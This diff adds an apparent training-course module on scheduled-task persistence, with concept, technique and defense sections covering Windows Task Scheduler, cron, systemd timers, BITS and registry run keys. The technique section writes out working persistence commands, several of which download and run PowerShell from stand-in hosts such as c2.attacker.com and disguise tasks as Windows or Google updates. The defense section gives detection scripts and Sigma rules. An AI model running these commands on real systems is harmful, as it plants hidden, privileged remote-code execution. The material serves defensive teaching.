@@ -1,0 +1,710 @@
+  'scheduled-tasks': {
+    concept: `
+<h2>Scheduled Task Persistence: Architecture, Abuse, and the Attacker Kill Chain</h2>
+
+<h3>Why Persistence Matters: The Attacker's Continuity Problem</h3>
+<p>
+  From an attacker's perspective, initial access is a fragile state. The vulnerability
+  exploited might be patched within hours of a security team noticing anomalous behavior.
+  The compromised user account might have its password changed. The reverse shell process
+  dies when the system reboots. For an APT group conducting long-term espionage — or a
+  ransomware operator who needs time to move laterally, establish additional footholds,
+  exfiltrate data, and deploy ransomware at scale — losing access after days of effort is
+  catastrophic. Persistence mechanisms solve this problem by ensuring re-execution of
+  attacker-controlled code independently of the original vulnerability, user sessions,
+  or running processes.
+</p>
+<p>
+  Scheduled tasks represent the ideal persistence category for several reasons. They are
+  a <strong>built-in OS feature</strong> designed for exactly this purpose — running code
+  automatically based on time or system events. Antivirus products cannot flag
+  <code>schtasks.exe</code>, <code>cron</code>, or <code>systemctl</code> as malicious
+  because they are legitimate system utilities used by thousands of legitimate processes.
+  This is the essence of <strong>Living off the Land (LOLBin)</strong> tradecraft: using
+  what is already present to avoid detection. MITRE ATT&CK catalogs this as
+  <strong>T1053 — Scheduled Task/Job</strong>, one of the most commonly observed persistence
+  techniques in real-world intrusions.
+</p>
+<p>
+  The persistence trifecta attackers must satisfy: <em>execution</em> (something runs the
+  attacker's code), <em>trigger</em> (it runs automatically without attacker intervention),
+  and <em>privilege level</em> (ideally SYSTEM/root so the payload operates without user
+  permission constraints).
+</p>
+
+<h3>Windows Task Scheduler: Deep Architecture</h3>
+
+<h4>Component Architecture</h4>
+<p>
+  The Task Scheduler service runs as a host process in <code>svchost.exe</code> and exposes
+  both a COM interface and a native API that other processes use to create, modify, and
+  enumerate tasks. The service reads task definitions at startup and evaluates trigger
+  conditions continuously, spawning new processes when conditions are met.
+</p>
+
+<h4>Storage Locations</h4>
+<p>
+  Windows stores task definitions in two places simultaneously — both are relevant to forensics:
+</p>
+<pre><code>File system (XML definitions):
+C:\\Windows\\System32\\Tasks\                   primary location
+C:\\Windows\\SysWOW64\\Tasks\                   32-bit tasks on 64-bit systems
+
+Registry (binary cache):
+HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\
+  {GUID}\  contains binary blob of task settings
+HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\
+  TaskName  links to the GUID in Tasks\
+
+Forensic note: Discrepancies between XML files and registry cache indicate tampering.
+Some rootkits hide tasks by deleting the file but keeping the registry entry, or
+vice versa. Defenders must audit both locations independently.</code></pre>
+
+<h4>Task XML Structure: Every Element Explained</h4>
+<pre><code>&lt;?xml version="1.0" encoding="UTF-16"?&gt;
+&lt;Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"&gt;
+  &lt;RegistrationInfo&gt;
+    &lt;Description&gt;System health monitoring&lt;/Description&gt;
+    &lt;Author&gt;Microsoft Corporation&lt;/Author&gt;
+    &lt;!-- Attacker sets Author to a legitimate-looking value to fool defenders --&gt;
+  &lt;/RegistrationInfo&gt;
+  &lt;Triggers&gt;
+    &lt;LogonTrigger&gt;
+      &lt;Enabled&gt;true&lt;/Enabled&gt;
+      &lt;!-- Fires on ANY user logon — even after password changes --&gt;
+    &lt;/LogonTrigger&gt;
+    &lt;BootTrigger&gt;
+      &lt;!-- Fires at system startup — requires SYSTEM or admin principal --&gt;
+    &lt;/BootTrigger&gt;
+    &lt;EventTrigger&gt;
+      &lt;Subscription&gt;
+        &lt;QueryList&gt;&lt;Query&gt;
+          &lt;Select Path="Security"&gt;*[System[(EventID=4624)]]&lt;/Select&gt;
+        &lt;/Query&gt;&lt;/QueryList&gt;
+      &lt;/Subscription&gt;
+      &lt;!-- Fires when Event ID 4624 (successful logon) occurs — sophisticated trigger --&gt;
+    &lt;/EventTrigger&gt;
+  &lt;/Triggers&gt;
+  &lt;Principals&gt;
+    &lt;Principal id="Author"&gt;
+      &lt;UserId&gt;S-1-5-18&lt;/UserId&gt;
+      &lt;!-- S-1-5-18 = NT AUTHORITY\\SYSTEM — highest Windows privilege --&gt;
+      &lt;RunLevel&gt;HighestAvailable&lt;/RunLevel&gt;
+    &lt;/Principal&gt;
+  &lt;/Principals&gt;
+  &lt;Settings&gt;
+    &lt;Hidden&gt;true&lt;/Hidden&gt;
+    &lt;!-- Hides from Task Scheduler GUI — does NOT hide from PowerShell enumeration --&gt;
+    &lt;ExecutionTimeLimit&gt;PT0S&lt;/ExecutionTimeLimit&gt;
+    &lt;!-- PT0S = no timeout: task runs indefinitely --&gt;
+    &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;
+  &lt;/Settings&gt;
+  &lt;Actions Context="Author"&gt;
+    &lt;Exec&gt;
+      &lt;Command&gt;powershell.exe&lt;/Command&gt;
+      &lt;Arguments&gt;-WindowStyle Hidden -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGMAMgAuAGEAdAB0AGEAYwBrAGUAcgAuAGMAbwBtAC8AcwBoAGUAbABsAC4AcABzADEAJwApAA==&lt;/Arguments&gt;
+      &lt;!-- Decoded -EncodedCommand:
+           IEX(New-Object Net.WebClient).DownloadString('http://c2.attacker.com/shell.ps1')
+           Downloads and executes payload in memory — no file on disk --&gt;
+    &lt;/Exec&gt;
+  &lt;/Actions&gt;
+&lt;/Task&gt;</code></pre>
+
+<h4>Trigger Types and Attacker Selection Logic</h4>
+<ul>
+  <li><strong>ONLOGON:</strong> Fires for every user logon including after password changes
+  and remote logins. Does not require SYSTEM to create (any local admin can create it). The
+  most reliable persistence trigger for user-context payloads.</li>
+  <li><strong>ONSTART / BootTrigger:</strong> Fires at system startup. Requires SYSTEM or
+  administrator principal. Survives reboots with no users logged in. Used for system-wide
+  C2 beacons.</li>
+  <li><strong>ONEVENT:</strong> Triggers on a specific Windows Event ID. APT groups use
+  Event ID 4624 (successful logon) or 4625 (failed logon) to blend beaconing with expected
+  post-authentication traffic. Requires knowledge of the Windows event schema — a
+  sophistication indicator when observed.</li>
+  <li><strong>Time-based (SCHEDULE):</strong> Runs at specific times or intervals. APTs
+  use maintenance window timing (2-4 AM) to blend with legitimate maintenance tasks.
+  Too regular a schedule can create detectable periodic network traffic patterns.</li>
+</ul>
+
+<h3>Linux Cron: Architecture Deep Dive</h3>
+
+<h4>The Cron Daemon and Its Configuration Sources</h4>
+<p>
+  The cron daemon wakes up every minute, reads all crontab sources, and executes any
+  command whose time specification matches the current minute. It reads from multiple
+  sources in a defined order:
+</p>
+<pre><code>/etc/crontab             System-wide cron file (root only writable)
+                         Has extra "user" field: min hour day month dow USER command
+/etc/cron.d/             Drop-in cron files (installed by packages like logrotate)
+                         Same format as /etc/crontab (includes user field)
+/etc/cron.hourly/        Scripts run by run-parts every hour
+/etc/cron.daily/         Scripts run daily (usually at 6:25 AM via anacron)
+/etc/cron.weekly/        Scripts run weekly
+/etc/cron.monthly/       Scripts run monthly
+/var/spool/cron/crontabs/ Per-user crontabs (user field omitted — runs as file owner)
+  root                   Root's personal crontab
+  www-data               Web server user crontab (common attacker target)</code></pre>
+
+<h4>Cron Environment and Attacker Manipulation</h4>
+<pre><code># Cron runs with a minimal environment — not the user's login shell environment
+# Default PATH: /usr/bin:/bin (attackers may override)
+
+# Crontab environment variables (set at top of crontab file):
+SHELL=/bin/bash
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+MAILTO=""
+# MAILTO="" is critical for attacker evasion:
+# By default, cron emails the user any output from their jobs
+# If a cron job fails or produces output, the admin gets notified
+# Setting MAILTO="" silences all output — hides both failures and successes</code></pre>
+
+<h4>Anacron and the @reboot Directive</h4>
+<p>
+  Anacron is designed for systems that are not always powered on. It records when each job
+  last ran and executes missed jobs on the next boot, after a configurable delay. Attackers
+  use the <code>@reboot</code> cron directive because it fires on every system restart —
+  including emergency restarts, power failures, and administrator-initiated reboots triggered
+  during incident response.
+</p>
+<pre><code># User crontab entries:
+@reboot /tmp/.hidden/beacon.sh
+@reboot sleep 60 &amp;&amp; /tmp/.hidden/beacon.sh  # 60-second delay to blend with boot traffic
+
+# Anacron format (/etc/anacrontab):
+# period  delay  identifier  command
+1         5      malware.daily  /usr/lib/.svc/run
+# Runs daily, 5-minute delay after boot — misses are caught at next startup</code></pre>
+
+<h3>systemd Timers: Modern Linux Persistence</h3>
+<p>
+  systemd timers use a two-file design: a <code>.timer</code> unit defining when to trigger,
+  and a <code>.service</code> unit defining what to execute. This separation makes
+  timer-based persistence harder to spot in a quick cron audit because the malicious command
+  is in the service file, not the timer file.
+</p>
+<pre><code># /etc/systemd/system/network-monitor.service:
+[Unit]
+Description=Network Performance Monitor
+After=network.target
+
+[Service]
+Type=oneshot
+ExecStart=/usr/lib/net-mon/run.sh
+StandardOutput=null
+StandardError=null
+
+# /etc/systemd/system/network-monitor.timer:
+[Unit]
+Description=Run network monitor periodically
+
+[Timer]
+OnBootSec=5min          # First run 5 minutes after boot
+OnUnitActiveSec=1h      # Then every hour
+RandomizedDelaySec=300  # Random 0-300 second delay — prevents fixed-interval detection
+Persistent=true         # Run missed jobs at next boot
+
+[Install]
+WantedBy=timers.target
+
+# Enable:
+systemctl daemon-reload
+systemctl enable network-monitor.timer
+systemctl start network-monitor.timer
+
+# List all timers (defender command):
+systemctl list-timers --all</code></pre>
+
+<h4>systemd Path Units: Filesystem-Triggered Persistence</h4>
+<pre><code># /etc/systemd/system/deploy-trigger.path:
+[Path]
+PathExists=/tmp/deploy.trigger     # Fires when this specific file is created
+Unit=deploy-trigger.service
+
+[Install]
+WantedBy=multi-user.target
+
+# Attacker creates /tmp/deploy.trigger remotely to trigger execution on demand.
+# No regular schedule means no periodic anomaly in network or process monitoring.</code></pre>
+
+<h3>Related Persistence Mechanisms Beyond Scheduled Tasks</h3>
+
+<h4>Windows Registry Run Keys</h4>
+<pre><code># Most commonly abused registry persistence locations:
+HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+# Executes at user logon — runs as that user (no elevation needed to create)
+
+HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+# Executes at logon for all users — requires admin to write
+
+HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon
+# Userinit value: normally "C:\\Windows\\system32\\userinit.exe,"
+# Attacker appends: ",C:\\malware.exe"
+# Shell value: normally "explorer.exe"
+# Attacker replaces with: "malware.exe" — malware runs as the shell itself</code></pre>
+
+<h4>Windows Startup Folders</h4>
+<pre><code># Per-user startup (no admin needed):
+C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\
+# Any executable or shortcut here runs at user logon
+
+# System-wide startup (admin required):
+C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\
+# Runs for ALL users who log on</code></pre>
+
+<h4>Linux rc.local and PAM</h4>
+<pre><code># /etc/rc.local (legacy but still present on many systems):
+#!/bin/bash
+# Commands here run at boot as root
+/usr/lib/.svc/run &amp;
+exit 0
+
+# PAM (Pluggable Authentication Modules) — executes code during login:
+# /etc/pam.d/common-session (add line):
+session optional pam_exec.so /usr/lib/.svc/login-hook.sh
+# Runs login-hook.sh every time any user logs in
+# PAM modification is rare and sophisticated — a high-value target for auditing</code></pre>
+`,
+    technique: `
+<h2>Scheduled Task Persistence Techniques: Creation, Hiding, and Fileless Variants</h2>
+
+<h3>Windows: schtasks.exe (Command Line LOLBin)</h3>
+<pre><code># ONLOGON persistence — fires for every user login:
+schtasks /create /tn "WindowsUpdate" /sc ONLOGON /f \
+  /tr "powershell.exe -WindowStyle Hidden -NonInteractive -c IEX(New-Object Net.WebClient).DownloadString('http://c2.attacker.com/shell.ps1')"
+# /tn = task name (chosen to look legitimate)
+# /sc ONLOGON = trigger on any user logon (survives password changes)
+# /f = force create (overwrite if exists)
+# -WindowStyle Hidden = no visible PowerShell window
+# IEX(...DownloadString) = download and execute in memory — no file on disk
+
+# SYSTEM-level boot persistence:
+schtasks /create /tn "SystemHealthCheck" /sc ONSTART /ru SYSTEM /f \
+  /tr "C:\\Windows\\Temp\\update.exe"
+# /sc ONSTART = trigger at system startup
+# /ru SYSTEM = run as NT AUTHORITY\\SYSTEM — highest privilege, no password needed
+
+# Blend under Microsoft task path hierarchy:
+schtasks /create /f /ru SYSTEM /sc DAILY /st 02:00 \
+  /tn "\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Scan" \
+  /tr "C:\\ProgramData\\Microsoft\\svcupdate.exe"
+# Task stored under \\Microsoft\\Windows\\WindowsUpdate\
+# Visually indistinguishable from legitimate Windows Update tasks in GUI
+
+# ONEVENT trigger — fires on specific Windows Event:
+schtasks /create /tn "SecurityAudit" /ru SYSTEM /f \
+  /tr "C:\\Windows\\Temp\\beacon.exe" \
+  /sc ONEVENT "/EC Security /MO *[System[EventID=4624]]"
+# Triggers when Event ID 4624 (successful logon) is logged
+# APT groups use this to blend beaconing with post-authentication traffic</code></pre>
+
+<h3>Windows: PowerShell (Register-ScheduledTask)</h3>
+<pre><code># PowerShell provides full programmatic control over task creation:
+
+$B64 = "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGMAMgAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA="
+
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -EncodedCommand $B64"
+
+$trigger   = New-ScheduledTaskTrigger -AtLogOn
+$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+$settings  = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit 0
+
+Register-ScheduledTask -TaskName "\\Microsoft\\Windows\\Defrag\\ScheduledDefrag" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force
+
+# The -EncodedCommand is Base64 UTF-16LE encoded PowerShell:
+# Decoded: IEX(New-Object Net.WebClient).DownloadString('http://c2.example.com/shell.ps1')
+# Avoids writing payload to disk and prevents the command from appearing in plaintext logs</code></pre>
+
+<h3>Fileless Scheduled Task: Payload in Registry</h3>
+<pre><code># Store the actual payload in a registry value (no executable file on disk):
+
+# Step 1: Write encoded payload to registry
+$encoded = [Convert]::ToBase64String(
+  [System.Text.Encoding]::Unicode.GetBytes(
+    'IEX(New-Object Net.WebClient).DownloadString("http://c2.attacker.com/ps1")'
+  )
+)
+Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Theme" -Name "ColorTheme" -Value $encoded
+# Payload hidden in a legitimate-looking registry key
+
+# Step 2: Scheduled task reads payload from registry and executes:
+$cmd = 'powershell.exe -c "$p=(Get-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Theme).ColorTheme; IEX([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($p)))"'
+schtasks /create /tn "ThemeService" /sc ONLOGON /ru SYSTEM /f /tr $cmd
+
+# What exists on disk: only the task XML with a PowerShell read-from-registry command
+# The actual malicious payload is a registry string value — appears to be theme config
+# File-scanning antivirus will not find the payload
+# Registry monitoring (Sysmon Event ID 12/13) would detect it if properly configured</code></pre>
+
+<h3>Linux Cron Persistence: Multiple Locations</h3>
+<pre><code># Method 1: User crontab (no root needed for www-data or any user shell)
+(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.hidden/beacon.sh") | crontab -
+
+# Method 2: System cron snippet (requires root — looks like package-installed task)
+cat &gt; /etc/cron.d/syscheck &lt;&lt; 'EOF'
+SHELL=/bin/sh
+MAILTO=""
+*/15 * * * * root /usr/lib/syscheck/.run
+EOF
+chmod 644 /etc/cron.d/syscheck
+# Permissions 644 match legitimate cron.d files (root owned, world-readable)
+
+# Method 3: @reboot directive (fires on every restart including emergency reboots)
+echo "@reboot /tmp/.hidden/beacon.sh" | crontab -u www-data -
+# OR add to /etc/crontab:
+echo "@reboot root /usr/lib/.svc/run" &gt;&gt; /etc/crontab
+
+# Suppress output to avoid email alerts to administrators:
+echo "*/5 * * * * /tmp/.hidden/beacon.sh &gt;/dev/null 2&gt;&amp;1" | crontab -</code></pre>
+
+<h3>Linux: systemd Timer Persistence</h3>
+<pre><code># Write service unit (the actual command):
+cat &gt; /etc/systemd/system/dbus-monitor-helper.service &lt;&lt; 'EOF'
+[Unit]
+Description=D-Bus Monitoring Helper
+After=dbus.service
+
+[Service]
+Type=oneshot
+ExecStart=/usr/lib/dbus/.helper
+StandardOutput=null
+StandardError=null
+EOF
+
+# Write timer unit (the schedule):
+cat &gt; /etc/systemd/system/dbus-monitor-helper.timer &lt;&lt; 'EOF'
+[Unit]
+Description=D-Bus Monitoring Helper Timer
+
+[Timer]
+OnBootSec=3min
+OnUnitActiveSec=30min
+RandomizedDelaySec=180
+Persistent=true
+
+[Install]
+WantedBy=timers.target
+EOF
+
+# Enable the timer (persists across reboots):
+systemctl daemon-reload
+systemctl enable dbus-monitor-helper.timer
+systemctl start dbus-monitor-helper.timer
+
+# The name "dbus-monitor-helper" blends with D-Bus infrastructure.
+# A defender listing timers sees plausible-looking system service names.</code></pre>
+
+<h3>APT41: "GoogleUpdateTaskMachineUA" Pattern Analysis</h3>
+<p>
+  Google Chrome installs two scheduled tasks on every Windows system with Chrome installed:
+  <code>GoogleUpdateTaskMachineCore</code> and <code>GoogleUpdateTaskMachineUA</code>.
+  APT41 creates a malicious task with the identical name in a slightly different path hierarchy:
+</p>
+<pre><code>Legitimate Google task:
+  Name:    GoogleUpdateTaskMachineUA
+  Path:    \\GoogleUpdateTaskMachineUA
+  Action:  C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe /ua /installsource scheduler
+  Trigger: Every hour
+  RunAs:   Current interactive user
+
+APT41 malicious task:
+  Name:    GoogleUpdateTaskMachineUA
+  Path:    \\Google\\GoogleUpdateTaskMachineUA   (extra \\Google\ path level)
+  Action:  rundll32.exe C:\\ProgramData\\Google\\ChromeUpdate.dll,DllEntry
+  Trigger: Every 3 minutes (rapid re-execution)
+  RunAs:   SYSTEM
+  Hidden:  true
+
+Defender confusion:
+  The task list shows two "GoogleUpdateTaskMachineUA" entries.
+  One is legitimate, one is malicious.
+  The path difference (\  vs  \\Google\) is easily missed in a crowded task list.
+  The malicious one runs as SYSTEM every 3 minutes — significantly higher privilege
+  and more frequent execution than the legitimate task.</code></pre>
+
+<h3>BITS Jobs as Scheduled-Task-Like Persistence (Carbanak/FIN7)</h3>
+<pre><code># Background Intelligent Transfer Service (BITS) — built into Windows for update downloads
+# BITS jobs persist across reboots and survive user logoff
+# MITRE ATT&amp;CK: T1197 — BITS Jobs
+
+# Create a BITS job that downloads and executes on completion:
+bitsadmin /create malware
+bitsadmin /addfile malware http://c2.attacker.com/update.exe C:\\Windows\\Temp\\update.exe
+bitsadmin /SetNotifyCmdLine malware C:\\Windows\\Temp\\update.exe NULL
+bitsadmin /SetMinRetryDelay malware 60
+bitsadmin /resume malware
+
+# BITS jobs persist in C:\\ProgramData\\Microsoft\\Network\\Downloader\
+# Run as BITS service (SYSTEM) — high privilege
+# Most SIEM rules focus on schtasks.exe and cron — BITS is significantly undermonitored</code></pre>
+`,
+    defense: `
+<h2>Detecting and Preventing Malicious Scheduled Tasks and Persistence Mechanisms</h2>
+
+<h3>Windows: Enabling Task Scheduler Audit Logging</h3>
+<p>
+  Windows does not enable Task Scheduler audit logging by default. This must be explicitly
+  configured via Group Policy. Without it, defenders have no record of when tasks were
+  created, modified, or deleted.
+</p>
+<pre><code># Enable via Group Policy (GPO):
+# Computer Configuration
+#   Policies
+#   Windows Settings
+#   Security Settings
+#   Advanced Audit Policy Configuration
+#   System Audit Policies
+#   Object Access
+#   Audit Other Object Access Events
+#   Enable: Success and Failure
+
+# Verify via auditpol:
+auditpol /get /subcategory:"Other Object Access Events"
+# Should show: Success and Failure
+
+# Relevant Security Log Event IDs after enabling:
+# 4698 = Scheduled task was created
+# 4699 = Scheduled task was deleted
+# 4700 = Scheduled task was enabled
+# 4701 = Scheduled task was disabled
+# 4702 = Scheduled task was updated (modified)
+# These events contain the full task XML in the event data
+
+# Task Scheduler Operational Log:
+# (Applications and Services Logs\\Microsoft\\Windows\\TaskScheduler\\Operational)
+# Event ID 106 = Task registered
+# Event ID 140 = Task triggered by user
+# Event ID 141 = Task removed
+# Event ID 200 = Task action started (what process actually ran)
+# Event ID 201 = Task action completed</code></pre>
+
+<h3>Windows: PowerShell Enumeration for Suspicious Tasks</h3>
+<pre><code># List all scheduled tasks with executable paths:
+Get-ScheduledTask | Select TaskName, TaskPath, State, @{
+    N='Execute'; E={$_.Actions.Execute}
+}, @{
+    N='Arguments'; E={$_.Actions.Arguments}
+} | Format-Table -AutoSize
+
+# Find tasks running from suspicious directories:
+Get-ScheduledTask | Where-Object {
+    $_.Actions.Execute -match 'Temp|AppData|ProgramData|Public|Downloads' -or
+    $_.Actions.Execute -match '\\\Users\\'
+} | Select TaskName, TaskPath, @{N='Exe';E={$_.Actions.Execute}}
+
+# Find tasks with encoded PowerShell (obfuscation indicator):
+Get-ScheduledTask | Where-Object {
+    $_.Actions.Arguments -match '-EncodedCommand|-enc |-e ' -or
+    $_.Actions.Arguments -match 'DownloadString|IEX|Invoke-Expression'
+} | Select TaskName, @{N='Args';E={$_.Actions.Arguments}}
+
+# Find SYSTEM tasks — sort by creation date (newest first):
+Get-ScheduledTask | Where-Object {
+    $_.Principal.UserId -match 'SYSTEM|S-1-5-18'
+} | Select TaskName, TaskPath, @{N='Date';E={$_.Date}} | Sort Date -Descending
+
+# Find hidden tasks:
+Get-ScheduledTask | Where-Object { $_.Settings.Hidden -eq $true } | Select TaskName, TaskPath</code></pre>
+
+<h3>Sigma Detection Rules for Task Creation</h3>
+<pre><code># Rule 1: Task created with encoded PowerShell command
+title: Scheduled Task with Encoded PowerShell
+logsource:
+    product: windows
+    service: security
+detection:
+    selection:
+        EventID: 4698
+    encoded_cmd:
+        TaskContent|contains:
+            - 'EncodedCommand'
+            - '-enc '
+            - 'DownloadString'
+            - 'IEX '
+            - 'Invoke-Expression'
+    condition: selection and encoded_cmd
+level: high
+tags:
+    - attack.persistence
+    - attack.t1053.005
+
+# Rule 2: Task executing from temp or user directories
+title: Scheduled Task Executing from Suspicious Path
+logsource:
+    product: windows
+    service: security
+detection:
+    selection:
+        EventID: 4698
+    suspicious_path:
+        TaskContent|contains:
+            - '\\\Temp\\'
+            - '\\\AppData\\'
+            - '\\\ProgramData\\'
+            - '\\\Users\\\Public\\'
+    condition: selection and suspicious_path
+level: high
+
+# Rule 3: New SYSTEM task under Microsoft path hierarchy (APT41 technique)
+title: New SYSTEM Task Under Microsoft Path
+logsource:
+    product: windows
+    service: security
+detection:
+    selection:
+        EventID: 4698
+    system_task:
+        TaskContent|contains: 'S-1-5-18'
+    microsoft_path:
+        TaskContent|contains: '\\\Microsoft\\'
+    condition: selection and system_task and microsoft_path
+level: medium
+falsepositives:
+    - Legitimate Windows software updates
+    - Endpoint security products</code></pre>
+
+<h3>Linux: Auditing All Cron and systemd Timer Locations</h3>
+<pre><code># Comprehensive cron audit script:
+#!/bin/bash
+echo "=== ROOT CRONTAB ==="
+crontab -l -u root 2&gt;/dev/null
+
+echo "=== ALL USER CRONTABS ==="
+for user in $(cut -d: -f1 /etc/passwd); do
+    output=$(crontab -l -u "$user" 2&gt;/dev/null)
+    if [ -n "$output" ]; then
+        echo "--- User: $user ---"
+        echo "$output"
+    fi
+done
+
+echo "=== /etc/crontab ==="
+cat /etc/crontab
+
+echo "=== /etc/cron.d/ ==="
+ls -la /etc/cron.d/
+for f in /etc/cron.d/*; do echo "--- $f ---"; cat "$f"; done
+
+echo "=== systemd TIMERS ==="
+systemctl list-timers --all
+
+echo "=== Recently modified cron files ==="
+find /etc/cron* /var/spool/cron -newer /etc/passwd -ls 2&gt;/dev/null
+
+echo "=== rc.local ==="
+cat /etc/rc.local 2&gt;/dev/null</code></pre>
+
+<pre><code># auditd rules to monitor cron modifications in real time:
+# Add to /etc/audit/rules.d/persistence.rules:
+-w /var/spool/cron -p wa -k cron_modification
+-w /etc/cron.d -p wa -k cron_modification
+-w /etc/crontab -p wa -k cron_modification
+-w /etc/systemd/system -p wa -k systemd_unit_write
+
+# Load rules:
+augenrules --load
+
+# Query audit log for cron changes:
+ausearch -k cron_modification --start recent | aureport -f</code></pre>
+
+<h3>AppLocker and WDAC: Preventing Unauthorized Execution</h3>
+<pre><code># AppLocker prevents execution of unauthorized scripts and executables
+# even when invoked from scheduled tasks.
+
+# Example: block scripts from temp directories
+# Group Policy:
+# Computer Configuration
+#   Windows Settings
+#   Security Settings
+#   Application Control Policies
+#   AppLocker
+#   Script Rules
+# Add rule: Deny, path condition = %TEMP%\*
+# Add rule: Deny, path condition = %LOCALAPPDATA%\\Temp\*
+
+# WDAC (Windows Defender Application Control) is more robust than AppLocker:
+# Enforced at kernel level — cannot be bypassed by local admin
+# Policy modes: Audit (log only) before switching to Enforce
+
+# Verify AppLocker configuration:
+Get-AppLockerPolicy -Effective | Format-List
+
+# Check WDAC policy status:
+Get-CIPolicy -FilePath C:\\Windows\\System32\\CodeIntegrity\\SIPolicy.p7b</code></pre>
+
+<h3>Baseline and Drift Detection</h3>
+<pre><code># Windows: Snapshot all scheduled tasks at known-clean state:
+Get-ScheduledTask | Select TaskName, TaskPath, @{
+    N='Execute'; E={$_.Actions.Execute}
+}, @{
+    N='Arguments'; E={$_.Actions.Arguments}
+}, @{
+    N='Principal'; E={$_.Principal.UserId}
+} | Export-Csv C:\\Baselines\\tasks_$(Get-Date -Format yyyyMMdd).csv
+
+# Weekly comparison — run via a legitimate scheduled task:
+$baseline = Import-Csv C:\\Baselines\\tasks_baseline.csv
+$current  = Get-ScheduledTask | Select TaskName, TaskPath, @{N='Execute';E={$_.Actions.Execute}}
+
+Compare-Object -ReferenceObject $baseline -DifferenceObject $current -Property TaskName |
+    Where-Object { $_.SideIndicator -eq '=&gt;' } |
+    ForEach-Object { Write-Warning "NEW TASK DETECTED: $($_.TaskName)" }
+
+# Linux: Snapshot and compare crontabs:
+crontab -l -u root &gt; /var/baselines/root_crontab_$(date +%Y%m%d)
+find /etc/cron.d -type f -exec md5sum {} \; &gt; /var/baselines/crond_hashes_$(date +%Y%m%d)
+
+# Daily comparison:
+diff /var/baselines/root_crontab_latest /var/baselines/root_crontab_$(date +%Y%m%d) \
+  &amp;&amp; echo "No crontab changes" \
+  || echo "CRONTAB CHANGED — investigate immediately"</code></pre>
+
+<h3>Startup Item Monitoring: Registry Run Keys and Autoruns</h3>
+<pre><code># SysInternals Autoruns: comprehensive startup item inventory
+# Enumerate all startup locations with hashes:
+autorunsc.exe -a * -c -h -s "*" &gt; autoruns_$(Get-Date -Format yyyyMMdd).csv
+# -a * = all startup locations (registry, services, drivers, scheduled tasks, etc.)
+# -c   = CSV output
+# -h   = compute SHA-256 file hashes
+# Compare weekly CSV exports to detect new entries
+
+# Sysmon monitoring for registry run key additions:
+# Event ID 12 = Registry key created or deleted
+# Event ID 13 = Registry value set
+# sysmon-config.xml:
+&lt;RegistryEvent onmatch="include"&gt;
+  &lt;TargetObject condition="contains"&gt;\\CurrentVersion\\Run&lt;/TargetObject&gt;
+  &lt;TargetObject condition="contains"&gt;Winlogon\\Userinit&lt;/TargetObject&gt;
+  &lt;TargetObject condition="contains"&gt;Winlogon\\Shell&lt;/TargetObject&gt;
+&lt;/RegistryEvent&gt;
+
+# Sigma rule for suspicious Run key additions:
+title: New Entry Added to Windows Autorun Registry Keys
+logsource:
+    product: windows
+    service: sysmon
+detection:
+    selection:
+        EventID:
+            - 12
+            - 13
+        TargetObject|contains:
+            - '\\CurrentVersion\\Run\'
+            - '\\CurrentVersion\\RunOnce\'
+    suspicious_exe:
+        Details|contains:
+            - 'powershell'
+            - 'cmd.exe'
+            - 'wscript'
+            - 'cscript'
+            - 'mshta'
+            - 'regsvr32'
+            - 'rundll32'
+    condition: selection and suspicious_exe
+level: high
+tags:
+    - attack.persistence
+    - attack.t1547.001</code></pre>
+`,
+  },
